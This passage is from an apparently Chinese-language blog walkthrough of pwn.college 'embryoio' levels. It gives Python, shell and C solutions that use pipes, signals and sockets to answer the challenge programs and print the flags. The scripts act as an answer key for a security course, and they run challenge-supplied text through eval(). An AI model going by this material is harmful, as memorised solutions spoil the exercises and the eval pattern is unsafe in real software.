<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python脚本</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span>  <span class="hljs-comment">#info级别以上的日志会被打印</span><br>r = process([<span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;./b.sh&#x27;</span>])<span class="hljs-comment"># echo &#x27;/challenge/embryoio_level*&#x27; &gt; b.sh</span><br><span class="hljs-comment"># 这里就是创建一个子进程，然后运行bash命令执行脚本，以通过shellscript的检测</span><br>r.recvuntil(<span class="hljs-string">b&quot;you will need to compute responses for.\n&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        text = r.recv(<span class="hljs-number">1024</span>, timeout=<span class="hljs-number">1</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment"># 接收子进程的输出</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Please send the solution for:&quot;</span> <span class="hljs-keyword">in</span> text:<br>            exp = text[text.find(<span class="hljs-string">&quot;:&quot;</span>)+<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 获取表达式</span><br>            <span class="hljs-comment"># exp = &quot;python -c &quot; + &quot;\&quot;print(&quot; + exp + &quot;)\&quot;&quot;  #这个就是使用python命令行执行了</span><br>            res = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(exp))  <span class="hljs-comment"># 执行表达式</span><br>            log.info(<span class="hljs-string">f&quot;result is: <span class="hljs-subst">&#123;res&#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印执行的结果</span><br>            <span class="hljs-comment"># cal = subprocess.getoutput(exp)  # 这里通过subprocess模块构造的命令来获取输出</span><br>            <span class="hljs-comment"># log.success(cal)  # 打印相应log</span><br>            r.sendline(res)  <span class="hljs-comment"># 将结果发送给子进程</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>                text += r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment">#接收子进程的全部内容</span><br>                log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])  <span class="hljs-comment"># 打印flag</span><br>                <span class="hljs-keyword">break</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    log.error(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
<h3 id="wp2-2"><a class="markdownIt-Anchor" href="#wp2-2"></a> wp2</h3>
<p>​	命令行先执行初始操作</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkfifo t1<br>mkfifo t2<br>echo &#x27;/challenge/embryoio_level* &gt; t1 &lt; t2 &amp; python c.py&#x27; &gt; b.sh<br></code></pre></td></tr></table></figure>
<p>​	python脚本如下，然后直接运行 <code>bash b.sh</code> 即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./t1&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)  <span class="hljs-comment"># 利用t1通道进行输入数据</span><br>f2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./t2&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)  <span class="hljs-comment"># t2通道输出数据</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>    s=f1.readline()<br>    <span class="hljs-built_in">print</span>(s)<br>    index=s.find(<span class="hljs-string">b&quot;r: &quot;</span>)  <span class="hljs-comment"># 如果有这个标志说明这一行是需要运算的，注意这里的r，不加的话会匹配到前面的一个&quot;: &quot;然后报错</span><br>    <span class="hljs-keyword">if</span> index != -<span class="hljs-number">1</span>:<br>        exp=s[index+<span class="hljs-number">3</span>:-<span class="hljs-number">1</span>] <span class="hljs-comment">#&quot;r: &quot;总共3个字符，后面才是表达式</span><br>        res=<span class="hljs-built_in">eval</span>(exp)  <span class="hljs-comment"># 运算得到结果</span><br>        f2.write(<span class="hljs-string">b&quot;%d\n&quot;</span> %res)  <span class="hljs-comment"># 写入t2传回结果</span><br>        f2.flush()  <span class="hljs-comment"># 缓冲区清空需要加，不加这一行原程序得不到我们的运行结果</span><br>f1.close()<br>f2.close()<br></code></pre></td></tr></table></figure>
<h2 id="level-126"><a class="markdownIt-Anchor" href="#level-126"></a> level 126</h2>
<blockquote>
<p>这次计算的是500个表达式，其中会有很长的式子</p>
</blockquote>
<p>​	对于wp1，只需要将接收的字符串从 <code>1024</code> 增长到 <code>10240</code> 就可以通过，这里表达式太长了，1024字节不够。而对于wp2，升级一下脚本，主要是过滤一下输入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./t1&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<span class="hljs-comment">#利用t1通道进行输入数据</span><br>f2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./t2&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<span class="hljs-comment">#t2通道输出数据</span><br><span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3000</span>):<br>    s=f1.readline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> &gt;=<span class="hljs-number">500</span>: <span class="hljs-comment"># sum用来统计计算的表达式有没有到500个，到了就输出后面读到的内容，没有不输出了，让程序运行的快一点</span><br>        <span class="hljs-comment"># print(s)  # 没什么必要，主要是看读取的数据</span><br>        <span class="hljs-built_in">print</span>(f1.read())<br>        <span class="hljs-keyword">break</span><br>    index=s.find(<span class="hljs-string">b&quot;r: &quot;</span>)  <span class="hljs-comment">#如果有这个标志说明这一行是需要运算的</span><br>    <span class="hljs-keyword">if</span> index != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">sum</span>+=<span class="hljs-number">1</span><br>        exp=s[index+<span class="hljs-number">3</span>:-<span class="hljs-number">1</span>] <span class="hljs-comment">#&quot;r: &quot;总共3个字符，后面才是表达式</span><br>        res=<span class="hljs-built_in">eval</span>(exp)  <span class="hljs-comment"># 运算得到结果</span><br>        f2.write(<span class="hljs-string">b&quot;%d\n&quot;</span> %res)  <span class="hljs-comment"># 写入t2传回结果</span><br>        f2.flush()  <span class="hljs-comment"># 缓冲区清空需要加，不加这一行原程序得不到我们的运行结果</span><br>f1.close()<br>f2.close()<br></code></pre></td></tr></table></figure>
<h2 id="level-127"><a class="markdownIt-Anchor" href="#level-127"></a> level 127</h2>
<blockquote>
<p>使用python来批量发送信号</p>
</blockquote>
<p>​	运行 <code>bash b.sh &amp;</code>，然后再运行 <code>python c.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br>sig = [<span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sig:<br>    code=<span class="hljs-string">&quot;kill &quot;</span>+<span class="hljs-string">&quot;-&quot;</span>+i[<span class="hljs-number">3</span>:]+<span class="hljs-string">&quot; 2992&quot;</span>  <span class="hljs-comment"># 这里如果直接使用i来作为参数会报错&#x27;/bin/sh: 1: kill: Illegal option -S&#x27;，gpt说这是因为古老的linux不支持-S选项，所以去掉前面的SIG，遮掩古老的linux可以识别了</span><br>    <span class="hljs-built_in">print</span>(code)<br>    subprocess.run(code,shell=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p>​	另一种使用pwntools的方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>r = process([<span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;./b.sh&#x27;</span>])<br><br>r.recvuntil(<span class="hljs-string">b&quot;[TEST] You must send me (PID &quot;</span>)<br>pid = <span class="hljs-built_in">int</span>((r.recvuntil(<span class="hljs-string">&quot;)&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>))[:-<span class="hljs-number">1</span>], <span class="hljs-number">10</span>)  <span class="hljs-comment"># 获取pid，转化为十进制</span><br>log.success(<span class="hljs-string">&quot;pid = &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(pid)))<br>r.recvuntil(<span class="hljs-string">b&quot;in exactly this order: [&#x27;&quot;</span>)<br><br>signals = (r.recvuntil(<span class="hljs-string">b&quot;&#x27;]&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))[:-<span class="hljs-number">2</span>]<br>signal_list = signals.split(<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(signal_list)<br><br>signal_all = [<span class="hljs-string">&#x27;SIGHUP&#x27;</span>, <span class="hljs-string">&#x27;SIGINT&#x27;</span>, <span class="hljs-string">&#x27;SIGQUIT&#x27;</span>, <span class="hljs-string">&#x27;SIGILL&#x27;</span>, <span class="hljs-string">&#x27;SIGTRAP&#x27;</span>, <span class="hljs-string">&#x27;SIGABRT&#x27;</span>, <span class="hljs-string">&#x27;SIGBUS&#x27;</span>, <span class="hljs-string">&#x27;SIGFPE&#x27;</span>, <span class="hljs-string">&#x27;SIGKILL&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR1&#x27;</span>, <span class="hljs-string">&#x27;SIGSEGV&#x27;</span>, <span class="hljs-string">&#x27;SIGUSR2&#x27;</span>, <span class="hljs-string">&#x27;SIGPIPE&#x27;</span>, <span class="hljs-string">&#x27;SIGALRM&#x27;</span>, <span class="hljs-string">&#x27;SIGTERM&#x27;</span>, <span class="hljs-string">&#x27;SIGSTKFLT&#x27;</span>, <span class="hljs-string">&#x27;SIGCHLD&#x27;</span>, <span class="hljs-string">&#x27;SIGCONT&#x27;</span>, <span class="hljs-string">&#x27;SIGSTOP&#x27;</span>, <span class="hljs-string">&#x27;SIGTSTP&#x27;</span>, <span class="hljs-string">&#x27;SIGTTIN&#x27;</span>, <span class="hljs-string">&#x27;SIGTTOU&#x27;</span>, <span class="hljs-string">&#x27;SIGURG&#x27;</span>, <span class="hljs-string">&#x27;SIGXCPU&#x27;</span>, <span class="hljs-string">&#x27;SIGXFSZ&#x27;</span>, <span class="hljs-string">&#x27;SIGVTALRM&#x27;</span>, <span class="hljs-string">&#x27;SIGPROF&#x27;</span>, <span class="hljs-string">&#x27;SIGWINCH&#x27;</span>, <span class="hljs-string">&#x27;SIGIO&#x27;</span>, <span class="hljs-string">&#x27;SIGPWR&#x27;</span>, <span class="hljs-string">&#x27;SIGSYS&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+1&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+2&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+3&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+4&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+5&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+6&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+7&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+8&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+9&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+10&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+11&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+12&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+13&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+14&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMIN+15&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-14&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-13&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-12&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-11&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-10&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-9&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-8&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-7&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-6&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-5&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-4&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-3&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-2&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX-1&#x27;</span>, <span class="hljs-string">&#x27;SIGRTMAX&#x27;</span>]<br><span class="hljs-keyword">for</span> signal <span class="hljs-keyword">in</span> signal_list:<br>    num = signal_all.index(signal)+<span class="hljs-number">1</span><br>    <span class="hljs-comment"># log.info(&quot;num=&gt;&#123;&#125;&quot;.format(str(num)))</span><br>    exp = <span class="hljs-string">&quot;kill -&quot;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-built_in">str</span>(pid) <span class="hljs-comment"># 这里是每个信号都对应一个标号，按标号一样的效果</span><br>    log.info(exp)<br>    subprocess.getoutput(exp)<br>    r.recv()<br><br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">else</span>:<br>    exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
<h2 id="level-129"><a class="markdownIt-Anchor" href="#level-129"></a> level 129</h2>
<blockquote>
<p>控制输入输出流</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">shell脚本，套用level 126的管道例子，不过记得修改处理表达式数量<span class="hljs-built_in">sum</span></span><br>cat &lt; t2 | /challenge/embryoio_level* | cat &gt; t1 &amp; python c.py<br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里让<span class="hljs-built_in">cat</span>从t2接收数据，传递给程序，再由程序输出给<span class="hljs-built_in">cat</span>，再给t1</span><br></code></pre></td></tr></table></figure>
<p>​	pwntools也行，参考level 134，基本一样，修改下p1即可</p>
<h2 id="level-134"><a class="markdownIt-Anchor" href="#level-134"></a> level 134</h2>
<blockquote>
<p>python中通过创建管道来进行通过cat的输入输出</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python脚本</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r1,w1=os.pipe()  <span class="hljs-comment"># 一个管道的读端与写端</span><br>p0 = process([<span class="hljs-string">&quot;cat&quot;</span>], stdin=subprocess.PIPE, stdout=w1)<br>r2,w2=os.pipe()<br>p1 = process([<span class="hljs-string">&quot;/challenge/embryoio_level134&quot;</span>],stdin=r1, stdout=w2)<br>p2 = process([<span class="hljs-string">&quot;cat&quot;</span>], stdin=r2, stdout=subprocess.PIPE)<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span>  <span class="hljs-comment">#info级别以上的日志会被打印</span><br>p2.recvuntil(<span class="hljs-string">b&quot;you will need to compute responses for.\n&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        text = p2.recv(<span class="hljs-number">1024</span>, timeout=<span class="hljs-number">1</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment"># 接收子进程的输出</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Please send the solution for:&quot;</span> <span class="hljs-keyword">in</span> text:<br>            exp = text[text.find(<span class="hljs-string">&quot;:&quot;</span>)+<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 获取表达式</span><br>            res = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(exp))  <span class="hljs-comment"># 执行表达式</span><br>            log.info(<span class="hljs-string">f&quot;result is: <span class="hljs-subst">&#123;res&#125;</span>&quot;</span>)  <span class="hljs-comment"># 打印执行的结果</span><br>            p0.sendline(res)  <span class="hljs-comment"># 将结果发送给子进程</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>                text += p1.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)  <span class="hljs-comment">#接收子进程的全部内容</span><br>                log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])  <span class="hljs-comment"># 打印flag</span><br>                <span class="hljs-keyword">break</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    log.error(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
<h2 id="level-135"><a class="markdownIt-Anchor" href="#level-135"></a> level 135</h2>
<p>​	跟shell脚本一样，直接利用pwntools里的 <code>r = process([&quot;./a&quot;])</code> 来运行就可以了</p>
<h2 id="level-139"><a class="markdownIt-Anchor" href="#level-139"></a> level 139</h2>
<p>​	套用level 126的脚本呢，然后<code>echo 'cat &lt; t2 | ./a | cat &gt; t1 &amp; python c.py' &gt; b.sh</code>，运行b.sh就行，不知道为什么pwntools使用cat会卡住，没有成功</p>
<h2 id="level-140"><a class="markdownIt-Anchor" href="#level-140"></a> level 140</h2>
<blockquote>
<p>使用c程序来实现套接字连接，然后歪路使用c模拟bash，具体怎么模拟看level 70-71</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_IP <span class="hljs-string">&quot;0.0.0.0&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_PORT 1564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE 1024</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> sockfd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server_addr</span>;</span><br>    <span class="hljs-type">char</span> buffer[BUFFER_SIZE];<br>    <span class="hljs-type">char</span> ans[BUFFER_SIZE];<br>    <span class="hljs-comment">// 创建套接字</span><br>    sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (sockfd == <span class="hljs-number">-1</span>) &#123;<br>        perror(<span class="hljs-string">&quot;socket&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">// 设置服务器地址</span><br>    server_addr.sin_family = AF_INET;<br>    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);<br>    server_addr.sin_port = htons(SERVER_PORT);<br><br>    <span class="hljs-comment">// 连接到服务器</span><br>    <span class="hljs-keyword">if</span> (connect(sockfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;server_addr, <span class="hljs-keyword">sizeof</span>(server_addr)) == <span class="hljs-number">-1</span>) &#123;<br>        perror(<span class="hljs-string">&quot;connect&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, BUFFER_SIZE);<br>        <span class="hljs-keyword">if</span> (recv(sockfd, buffer, BUFFER_SIZE, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>) &#123;<br>            perror(<span class="hljs-string">&quot;recv&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)&gt;<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Received: %s\n&quot;</span>, buffer);<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">memcmp</span>(<span class="hljs-string">&quot;[TEST] CHALLENGE! Please send the solution&quot;</span>,buffer,<span class="hljs-built_in">strlen</span>((<span class="hljs-string">&quot;[TEST] CHALLENGE! Please send the solution&quot;</span>))))<br>            &#123;<br>                <br>                <span class="hljs-built_in">memset</span>(ans, <span class="hljs-number">0</span>, BUFFER_SIZE);<br>                read(<span class="hljs-number">0</span>,ans,BUFFER_SIZE);<br>                <span class="hljs-keyword">if</span> (send(sockfd, ans, <span class="hljs-built_in">strlen</span>(ans), <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>) &#123;<br>                    perror(<span class="hljs-string">&quot;send&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>                &#125;<br>            &#125;<br><br>        &#125;<br>    &#125;<br>    close(sockfd);<br>    <span 